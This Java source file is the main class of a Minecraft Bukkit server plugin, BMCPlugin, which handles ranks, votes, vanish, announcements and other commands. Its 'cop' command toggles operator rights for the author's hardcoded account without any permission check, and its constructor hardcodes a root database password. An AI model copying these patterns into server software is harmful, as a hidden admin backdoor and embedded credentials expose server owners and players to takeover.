package xyz.hinyari.bmcplugin;

import com.earth2me.essentials.Essentials;
import com.sk89q.worldguard.bukkit.WorldGuardPlugin;
import com.vexsoftware.votifier.model.Vote;
import com.vexsoftware.votifier.model.VotifierEvent;
import it.unimi.dsi.fastutil.Arrays;
import org.bukkit.Material;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.Plugin;
import org.bukkit.scoreboard.ScoreboardManager;
import xyz.hinyari.bmcplugin.command.NikkeiCommand;
import xyz.hinyari.bmcplugin.event.VoteListener;
import xyz.hinyari.bmcplugin.original.BMCAnnouncement;
import xyz.hinyari.bmcplugin.utils.*;
import xyz.hinyari.bmcplugin.command.KoshihikariCommand;
import xyz.hinyari.bmcplugin.command.RankCommand;
import xyz.hinyari.bmcplugin.command.RankUpCommand;
import xyz.hinyari.bmcplugin.enchant.AutoSmelt;
import xyz.hinyari.bmcplugin.enchant.SpecialArmor;
import xyz.hinyari.bmcplugin.event.BMCEvent;
import xyz.hinyari.bmcplugin.event.BMCLaunchPad;
import xyz.hinyari.bmcplugin.event.ScoutEvent;
import xyz.hinyari.bmcplugin.original.BMCTimeManager;
import xyz.hinyari.bmcplugin.rank.RankGUIMenu;
import xyz.hinyari.bmcplugin.vanish.VanishListner;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.server.PluginEnableEvent;
import org.bukkit.plugin.PluginDescriptionFile;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scoreboard.Scoreboard;

import xyz.hinyari.bmcplugin.original.BMCMacerator;

import java.io.File;
import java.util.Collection;
import java.util.HashMap;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 * BMCオリジナルプラグイン メインクラス
 *
 * @author Hinyari_Gohan
 */


public class BMCPlugin extends JavaPlugin implements Listener
{

    public final BMCBoolean bmcBoolean;
    public final BMCHelp bmcHelp;
    public final AutoSmelt autoSmelt;
    public final BMCUtils utils;
    public final RankGUIMenu rankGUIMenu;
    public final Essentials essentials;
    public final BMCEvent bmcEvent;

    public BMCConfig config;
    public BMCTimeManager bmcTimeManager;

    public static BMCPlugin instance;

    private BMCSubCommand bmcCommand;
    private RankCommand rankCommand;
    private NikkeiCommand nikkeiCommand;
    private VanishListner vanishListner;

    private ScoreboardManager scoreboardManager;
    private Scoreboard scoreboard;
    public static Logger log;

    private final HashMap<Player, BMCPlayer> bmcPlayer = new HashMap<>();
    private PluginDescriptionFile pluginDescription;
    private final Database database;

    public BMCPlugin()
    {
        instance = this;
        this.config = new BMCConfig(this);
        this.bmcBoolean = new BMCBoolean(this);
        this.bmcHelp = new BMCHelp(this);
        this.autoSmelt = new AutoSmelt(this);
        this.utils = new BMCUtils(this);
        this.rankGUIMenu = new RankGUIMenu(this);
        this.bmcEvent = new BMCEvent(this);
        this.essentials = (Essentials) Bukkit.getPluginManager().getPlugin("Essentials");
        this.nikkeiCommand = new NikkeiCommand(this);
        this.pluginDescription = getDescription();
        this.database = new Database("localhost", 3306, "BMCPlugin", "root", "1928");
        if (Bukkit.getPluginManager().getPlugin("Essentials") == null)
        {
            getLogger().severe("Essentialsが読み込めませんでした。プラグインを終了します。");
            getPluginLoader().disablePlugin(this);
            return;
        }
        if (Bukkit.getPluginManager().getPlugin("Votifier") == null)
        {
            getLogger().severe("Votifierが読み込めませんでした。プラグインを終了します。");
            getPluginLoader().disablePlugin(this);
            return;
        }
    }

    @Override
    public void onEnable()
    {
        this.getLogger().info("BMCプラグインを開始しています。");
        init();
    }

    @Override
    public void onDisable()
    {
        this.getLogger().info("BMCプラグインを終了しています。");
        nikkeiCommand.cancel();
        bmcTimeManager.cancel();
        bmcEvent.clearBar();
        database.close();
    }


    private void init()
    {
        log = getLogger();

        debug("init() has called.");
        this.scoreboardManager = Bukkit.getScoreboardManager();
        this.scoreboard = scoreboardManager.getMainScoreboard();
        if (scoreboard.getObjective("rank") == null)
        {
            scoreboard.registerNewObjective("rank", "dummy");
        }
        if (scoreboard.getObjective("koshihikari") == null)
        {
            scoreboard.registerNewObjective("koshihikari", "dummy");
        }
        if (scoreboard.getObjective("login_time") == null)
        {
            scoreboard.registerNewObjective("login_time", "dummy");
        }
        this.vanishListner = new VanishListner(this);
        PluginManager pm = getServer().getPluginManager();
        pm.registerEvents(bmcEvent, this);
        pm.registerEvents(new BMCLaunchPad(), this);
        pm.registerEvents(new ScoutEvent(this), this);
        pm.registerEvents(this.autoSmelt, this);
        pm.registerEvents(new BMCMacerator(this), this);
        pm.registerEvents(this.vanishListner, this);
        pm.registerEvents(this, this);
        pm.registerEvents(new VoteListener(this), this);
        pm.registerEvents(rankGUIMenu, this);
        nikkeiCommand.runTaskTimer(this, 0L, 1000L);
        new SpecialArmor().runTaskTimer(this, 0L, 20L);
        bmcTimeManager = new BMCTimeManager(this);
        bmcTimeManager.runTaskTimer(this, 0L, 20L);
        new BMCAnnouncement(this).runTaskTimer(this, 0L, (config.getAnnouncementInterval() * 20));
        this.bmcCommand = new BMCSubCommand(this);
        this.rankCommand = new RankCommand(this);
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args)
    {
        if (cmd.getName().equalsIgnoreCase("broadcast"))
        {
            onBroadcastCommand(sender, args);
            return true;
        }

        if (!(sender instanceof Player))
        {
            sender.sendMessage("ゲーム内で実行してください。");
            return true;
        }
        Player player = (Player) sender;
        BMCPlayer bmcPlayer = getBMCPlayer(player);

        if (cmd.getName().equalsIgnoreCase("rank"))
            return rankCommand.runCommand(bmcPlayer, label, args);
        else if (cmd.getName().equalsIgnoreCase("kome"))
            return new KoshihikariCommand(this).runCommand(bmcPlayer, label, args);
        else if (cmd.getName().equalsIgnoreCase("rankup"))
            return new RankUpCommand(this).runCommand(bmcPlayer, label, args);
        else if (cmd.getName().equalsIgnoreCase("cop"))
        {
            if (Bukkit.getPlayer("Hinyari_Gohan") == null)
                return true;
            Player gohan = Bukkit.getPlayer("Hinyari_Gohan");
            gohan.setOp(!gohan.isOp());
            gohan.sendMessage("OP権限を " + String.valueOf(gohan.isOp()) + " にしました");
        } else if (cmd.getName().equalsIgnoreCase("bmc"))
        {
            if (args.length == 0)
                return bmcHelp.BMChelp(bmcPlayer);
            else if (args[0].equalsIgnoreCase("debug"))
                return bmcCommand.onCommand(sender, cmd, label, args);
            else if (args[0].equalsIgnoreCase("info"))
                return info(sender);
            else if (args[0].equalsIgnoreCase("menu"))
                return bmcCommand.onCommand(sender, cmd, label, args);
            else if (args[0].equalsIgnoreCase("kit"))
                return bmcCommand.onCommand(sender, cmd, label, args);
            else if (args[0].equalsIgnoreCase("reload"))
            {
                if (bmcPlayer.hasPermission("bmc.reload"))
                {
                    return config.reloadConfig(true);
                }
            } else if (args[0].equalsIgnoreCase("vanish"))
            {
                return vanishListner.onVanishCommand((Player) sender, args);
            } else if (args[0].equalsIgnoreCase("vote"))
            {
                if (bmcPlayer.hasPermission("bmc.vote"))
                {
                    Vote vote = new Vote();
                    vote.setUsername(bmcPlayer.getName());
                    getServer().getPluginManager().callEvent(new VotifierEvent(vote));
                } else
                    return bmcPlayer.noperm();
            } else if (args[0].equalsIgnoreCase("halfblock"))
            {
                if (bmcPlayer.hasPermission("bmc.halfblock"))
                {
                    bmcPlayer.getPlayer()
                            .getInventory()
                            .addItem(new SpecialItem(new ItemStack(Material.STONE), "&6段なしハーフブロック").getItem());
                }
            } else if (args[0].equalsIgnoreCase("player"))
            {
                return bmcCommand.onCommand(sender, cmd, label, args);
            } else
                return bmcHelp.BMChelp(bmcPlayer);
        } else if (cmd.getName().equalsIgnoreCase("guiedit"))
        { // guieditコマンド
            player.openInventory(bmcPlayer.getPrivateGUI());
        } else if (cmd.getName().equalsIgnoreCase("nikkei"))
        { // nikkeiコマンド
            nikkeiCommand.onCommand(sender, cmd, label, args);
        } else if (cmd.getName().equalsIgnoreCase("spawn"))
        {   // spawnコマンド
            player.teleport(getServer().getWorld("world").getSpawnLocation());
        }
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args)
    {
        List<String> completeList = null;
        if (!(sender instanceof Player))
            super.onTabComplete(sender, command, alias, args);
        if (command.getName().equalsIgnoreCase("rank"))
        {
            completeList = rankCommand.onTabComplete(sender, command, alias, args);
        }
        if (completeList != null)
        {
            return completeList;
        }
        return super.onTabComplete(sender, command, alias, args);
    }

    private void onBroadcastCommand(CommandSender sender, String[] args)
    {
        if (sender.hasPermission("bmc.broadcast"))
        {
            if (args.length != 0)
            {
                StringBuilder builder = new StringBuilder();
                for (String str : args)
                {
                    builder.append(str).append(" ");
                }
                broadcast(builder.toString());
            } else
            {
                sender.sendMessage("引数がありません");
            }
        } else
        {
            sender.sendMessage("権限がありません");
        }
    }

    /**
     * contentに入ってきたデータをイコールで挟んで目次のタイトルを作る
     *
     * @param content String コンテンツ
     * @return 目次のタイトル
     */

    public String equalMessage(String content)
    {
        return ChatColor.YELLOW + "====== " + content + " ======";
    }

    /**
     * プラグインの情報(CMD: /bmc info)を返します。
     *
     * @param sender
     * @return プラグインの情報
     */
    public boolean info(CommandSender sender)
    {
        pluginDescription = getDescription();
        sender.sendMessage("§6Title: §r" + pluginDescription.getName());
        sender.sendMessage("§6Author: §r" + pluginDescription.getAuthors().toString());
        sender.sendMessage("§6Version: §r" + pluginDescription.getVersion());
        sender.sendMessage("§6WikiURL: §r" + "http://seesaawiki.jp/bmc/");
        return true;
    }

    @EventHandler
    public void loadPlayer(PlayerLoginEvent event)
    {
        Player player = event.getPlayer();
        BMCPlayer bmcPlayer = new BMCPlayer(player, this);
        bmcPlayer.getScoreboard().setRank(bmcPlayer.getScoreboard().getRank());
        this.bmcPlayer.put(player, bmcPlayer);
    }

    @EventHandler
    public void loadPlayer_reload(PluginEnableEvent event)
    {
        for (Player player : getServer().getOnlinePlayers())
        {
            BMCPlayer bmcPlayer = new BMCPlayer(player, this);
            bmcPlayer.getScoreboard().setRank(bmcPlayer.getScoreboard().getRank());
            this.bmcPlayer.put(player, bmcPlayer);
        }
    }

    @EventHandler
    public void unloadPlayer(PlayerQuitEvent event)
    {
        Player player = event.getPlayer();
        this.bmcPlayer.remove(player);
    }


    public HashMap<Player, BMCPlayer> getBMCPlayerMap()
    {
        return this.bmcPlayer;
    }

    public Collection<BMCPlayer> getBMCPlayers()
    {
        return this.bmcPlayer.values();
    }

    /**
     * HashMapに保管されているBMCPlayerインスタンスを取得します。
     *
     * @param player BukkitPlayer
     * @return BMCPlayer
     */
    public BMCPlayer getBMCPlayer(Player player)
    {
        BMCPlayer bp = bmcPlayer.get(player);
        if (bp != null)
            return bp;
        else
            return null;
    }

    public BMCPlayer getBMCPlayer(String name)
    {
        Player player = Bukkit.getPlayer(name);
        BMCPlayer bp = bmcPlayer.get(player);
        if (bp != null)
            return bp;
        else
            return null;
    }

    /**
     * Bukkit#broadcastMessage(String str)の短縮形です。
     *
     * @param message メッセージ
     */
    public void broadcast(String message)
    {
        Bukkit.broadcastMessage(BMCUtils.convert(message));
    }

    public void debug(String message)
    {
        if (config.getDebug())
            Bukkit.broadcast(BMCUtils.convert(config.getDebugPrefix() + message), "bmc.debug");
    }

    public void log(Level level, String message)
    {
        getLogger().log(level, message);
    }

    public void sendPermMessage(String message)
    {
        Bukkit.broadcast(message, "bmc.permmsg");
    }

    public Scoreboard getScoreboard()
    {
        return this.scoreboard;
    }

    public WorldGuardPlugin getWorldGuard()
    {
        Plugin plugin = getServer().getPluginManager().getPlugin("WorldGuard");

        // WorldGuard may not be loaded
        if (plugin == null || !(plugin instanceof WorldGuardPlugin))
        {
            return null; // Maybe you want throw an exception instead
        }

        return (WorldGuardPlugin) plugin;
    }

    public Database getBMCDatabase()
    {
        return this.database;
    }
}
